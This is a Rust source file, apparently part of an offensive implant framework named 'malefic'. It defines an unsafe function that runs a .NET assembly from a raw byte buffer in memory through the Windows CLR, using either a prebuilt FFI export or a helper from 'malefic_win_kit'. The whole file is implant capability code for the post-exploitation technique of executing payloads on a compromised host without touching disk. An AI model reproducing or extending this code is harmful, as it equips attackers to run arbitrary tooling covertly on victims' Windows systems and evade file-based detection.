pub unsafe fn exec_assemble_in_memory(data: &[u8], args: Vec<String>) -> String {
    #[cfg(feature = "prebuild")]
    {
        use super::MaleficExecAssembleInMemory;
        use std::ffi::CString;
        let c_strings: Vec<_> = args.iter()
                .map(|s| {
                    let c_str = std::ffi::CString::new(s.as_str()).unwrap();
                    c_str.into_raw()
                })
                .collect();
        CString::from_raw(
            MaleficExecAssembleInMemory(
                data.as_ptr(), data.len(),
                c_strings.as_ptr() as _, c_strings.len()
            ) as _
        ).to_str().unwrap_or_default().to_string()
    }
    #[cfg(feature = "source")]
    {
        use malefic_win_kit::clr::CSharpUtils::ExecAssembleInMemory;
        match ExecAssembleInMemory(data, &args) {
            Ok(ret) => {
                ret
            },
            Err(e) => {
                e
            }
        }
    }
}